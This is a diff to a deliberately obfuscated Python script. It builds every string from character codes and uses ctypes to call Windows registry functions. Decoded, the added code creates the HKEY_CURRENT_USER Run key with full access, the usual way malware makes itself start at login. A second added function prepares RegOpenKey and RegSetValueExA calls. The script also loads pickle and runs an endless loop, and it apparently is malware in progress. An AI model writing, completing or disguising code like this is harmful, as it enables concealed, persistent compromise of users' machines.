@@ -1,6 +1,5 @@
 from builtins import getattr as PzQWXGyzczcO,hasattr as paluuoBFSqqz,setattr as AOpJLtJDJViR,staticmethod as wKPVjfEPxnTq
 from importlib import import_module as OZXBxjIACLZF
-from operator import attrgetter as QOtxnrCdgGyX
 from pickle import dumps as quAGLQfgcKUX,loads as rZVpYulkNmEb
 from ctypes import WinDLL as BKxevfZDUude,c_void_p as wCWPLfeeAGbS,byref as lmRFhJAVDJDB,wintypes as soBcyvkrClSD,POINTER as cywZNIzptFeI
 def BlGsWbOibgDw(ivMetmwPXMsX):
@@ -11,23 +10,45 @@ def BlGsWbOibgDw(ivMetmwPXMsX):
 
 def HsAFDkKrLWRm():
     GgXkASAzLVQH=wCWPLfeeAGbS
+    ycFobBVTcyoI=GgXkASAzLVQH()
     # RegCreateKeyExW
-    # YmeBnbLvNEvK=chr()
+    YmeBnbLvNEvK=chr(82)+().__class__.__name__[-1]+chr(0o107).lower()+chr(0x63).upper()+chr(0b1110010)+chr(101)+55.23.__class__.__name__[3:5]+chr(0o145)+chr(0x4B)+chr(69).lower()+chr(0o171)+chr(0b1000101)+chr(120)+chr(0x57)
     euuyprdPPlty=5.5.__class__.__name__[-2]+chr(0x72)+chr(0o147)+[].__class__.__name__[-1]+chr(121)+chr(0x70)+().__class__.__name__[-1]+chr(0x73)
     vVcjaTVKwLhL=chr(0o162)+chr(101)+chr(0b1110011)+().__class__.__name__[0]+chr(0x79)+().__class__.__name__[-3]+chr(0o145)
+    # LPCWSTR
     BCuMjPvFdHCy=PzQWXGyzczcO(soBcyvkrClSD,[].__class__.__name__[-4].upper()+chr(0x50)+{}.__class__.__name__[-2].upper()+chr(87)+chr(0b1010011)+().__class__.__name__[-5].upper()+chr(0o122))
+    # LPWSTR
     PkKdOnhiyivS=PzQWXGyzczcO(soBcyvkrClSD,[].__class__.__name__[0].upper()+chr(0b1010000)+chr(87)+''.__class__.__name__[-3].upper()+chr(0o124)+chr(0x52))
+    # LPDWORD
     RsGGBzEvIRTQ=PzQWXGyzczcO(soBcyvkrClSD,chr(0x4C)+chr(0o120)+{}.__class__.__name__[-4].upper()+chr(0o127)+chr(0b1001111)+chr(82)+chr(0x44))
+    # DWORD
     BCJUAoWHrxWa=PzQWXGyzczcO(soBcyvkrClSD,{}.__class__.__name__[0].upper()+chr(0x57)+False.__class__.__name__[-3].upper()+chr(0o122)+chr(0b1000100))
+    # LONG
     LvvygkBjAYFx=PzQWXGyzczcO(soBcyvkrClSD,chr(76)+77.43.__class__.__name__[2].upper()+chr(0x4E)+chr(0o107))
     gyALHFVPvhLL=wCWPLfeeAGbS(0x80000001)
+    VtTvnfZHmkSb=BCJUAoWHrxWa()
     bUlMAHgthpbN=cywZNIzptFeI(GgXkASAzLVQH)
+    DWxHIGHMihNq=r'{}'.format(chr(83)+False.__class__.__name__[-3]+4.31.__class__.__name__[-5]+10.145.__class__.__name__[-1]+chr(119)+chr(0o141)+chr(0b1110010)+().__class__.__name__[-1]+chr(0x5C)+chr(0o115)+[].__class__.__name__[-3]+chr(99)+chr(0x72)+True.__class__.__name__[2])
+    DvXyaVYykKmK=DWxHIGHMihNq+[].__class__.__name__[2]+chr(111)+5.6.__class__.__name__[0]+().__class__.__name__[-5]+chr(92)+chr(0x77).upper()+chr(0b1101001)+chr(0o156)+chr(100)+77.8.__class__.__name__[-3]
+    ESjzvfSkZLAQ=DvXyaVYykKmK+chr(119)+chr(0o163)+chr(0b1011100)+{}.__class__.__name__[-2].upper()+().__class__.__name__[1]+(chr(114)*2)+chr(0x65)+chr(0o156)+55.31.__class__.__name__[-1]+chr(86)+().__class__.__name__[-1]+chr(0o162)
+    oGTlykckCSxC=ESjzvfSkZLAQ+chr(115)+[].__class__.__name__[1]+chr(0x6F)+chr(0o156)+chr(0o134)+chr(0o122)+chr(0b1110101)+(chr(110))
     pSmTonsEmTFD=BKxevfZDUude(chr(0x6B)+().__class__.__name__[-1]+chr(0o162)+chr(0b1101110)+chr(101)+True.__class__.__name__[-1]+chr(51)+chr(0o62))
+    AOpJLtJDJViR(PzQWXGyzczcO(pSmTonsEmTFD,YmeBnbLvNEvK),euuyprdPPlty,(wCWPLfeeAGbS,BCuMjPvFdHCy,BCJUAoWHrxWa,PkKdOnhiyivS,BCJUAoWHrxWa,BCJUAoWHrxWa,wCWPLfeeAGbS,bUlMAHgthpbN,RsGGBzEvIRTQ))
+    AOpJLtJDJViR(PzQWXGyzczcO(pSmTonsEmTFD,YmeBnbLvNEvK),vVcjaTVKwLhL,LvvygkBjAYFx)
+    PzQWXGyzczcO(pSmTonsEmTFD,YmeBnbLvNEvK)(gyALHFVPvhLL,oGTlykckCSxC,0,None,0,0x000F003F,None,lmRFhJAVDJDB(ycFobBVTcyoI),lmRFhJAVDJDB(VtTvnfZHmkSb))
 
-    QOtxnrCdgGyX(pSmTonsEmTFD,euuyprdPPlty)
-    # AOpJLtJDJViR(pSmTonsEmTFD,euuyprdPPlty,(GgXkASAzLVQH,BCuMjPvFdHCy,BCJUAoWHrxWa,PkKdOnhiyivS,BCJUAoWHrxWa,BCJUAoWHrxWa,wCWPLfeeAGbS,bUlMAHgthpbN,RsGGBzEvIRTQ))
-    # AOpJLtJDJViR(pSmTonsEmTFD,vVcjaTVKwLhL,LvvygkBjAYFx)
-    # PzQWXGyzczcO(pSmTonsEmTFD,)
+def dcfcXvCEiDRj():
+    HWSLlOZARoVG=wCWPLfeeAGbS
+    WEAnXpJSRlJW=HWSLlOZARoVG()
+    # RegOpenKey
+    XJzocCqWABmG=chr(0b1010010)+().__class__.__name__[4]+chr(0x67)+56.2.__class__.__name__[-3].upper()+chr(80).lower()+chr(0o145)+chr(0x6E)
+    tYOYtuiXFdbt=XJzocCqWABmG+chr(75)+chr(0b1100101)+chr(0x79)+652.2.__class__.__name__[-2].upper()
+    # RegSetValueExA
+    uvUXkQcwHgAO=chr(0b1010010)+().__class__.__name__[4]+chr(0x67)+chr(83)+chr(0o145)+552.4.__class__.__name__[-1]+chr(86)+chr(0b1100001)
+    fpyXhZlZfHsn=uvUXkQcwHgAO+chr(0x6C)+().__class__.__name__[-4]+chr(101)+chr(0o105)+chr(88).lower()+chr(0b1000001)
+    zQtAYYTSwspI=BKxevfZDUude(chr(0o153)+().__class__.__name__[-1]+chr(0b1110010)+chr(110)+chr(0o145)+chr(0x6C)+chr(0o63)+chr(0b00110010))
+    kksdihEOuHfu=wCWPLfeeAGbS(0x80000001)
+    print(zQtAYYTSwspI)
 
 class IEEsvAAtTBOH:
     # BFjpdgHXTETR=OZXBxjIACLZF(chr(112)+[].__class__.__name__[-3]+{}.__class__.__name__[2]+chr(0x6B)+chr(0o154)+chr(101))
@@ -82,7 +103,7 @@ class gQruAhFOlNgi:
         CuBHzxwBuVsE=None
         oRgIrEzQlNRp=None
         if paluuoBFSqqz(self._FWOvqkkczoLg,self._eXcTtOpTKCIb):oRgIrEzQlNRp=PzQWXGyzczcO(self._FWOvqkkczoLg,self._eXcTtOpTKCIb)
-        HsAFDkKrLWRm()
+        dcfcXvCEiDRj()
         while(int(0b111)+2/3.0):
             try:
                 if oRgIrEzQlNRp:
@@ -104,4 +125,4 @@ class sBAfMdKBacnf:
         return ''.join(filter(None,wBJI6kjV5EWb))
     def oepiPZXSuWQp(self):gQruAhFOlNgi(self._QmJzWWGKPPgn).PJDqOuSwBFci()
     __init__=ZWFPj6ZrCyfX
-sBAfMdKBacnf().oepiPZXSuWQp() if __name__ == chr(95)+chr(0b1011111)+chr(109)+chr(0x61)+chr(0o151)+chr(0x6E)+chr(0o137)+chr(0x5F) else exit(1)
+sBAfMdKBacnf().oepiPZXSuWQp() if __name__==chr(95)+chr(0b1011111)+chr(109)+chr(0x61)+chr(0o151)+chr(0x6E)+chr(0o137)+chr(0x5F) else exit(1)
